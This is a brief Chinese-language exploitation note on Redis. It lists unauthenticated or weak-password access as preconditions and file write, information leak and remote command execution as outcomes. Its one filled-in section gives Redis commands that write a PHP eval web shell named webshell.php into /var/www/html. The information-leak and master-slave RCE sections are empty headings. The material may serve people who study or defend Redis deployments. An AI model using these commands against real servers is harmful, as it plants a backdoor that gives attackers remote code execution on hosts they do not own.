# Redis 漏洞利用
## 0x00 Introduction
redis是一个key-value存储系统。   

### 前置条件      
获取redis权限
- 未授权
- 弱口令

### 达成的漏洞利用效果
- 写任意文件
- 信息泄露
- 远程命令执行

## 0x01 漏洞利用

### 1. 信息泄露

### 2. 写任意文件->RCE

```
config set dir /var/www/html    
config set dbfilename webshell.php  
set shell "<?php @eval($_POST['shell']);?>"  
save  保存
```
### 3. 远程命令执行

#### 主从同步RCE


## Ref
- https://www.freebuf.com/column/237263.html
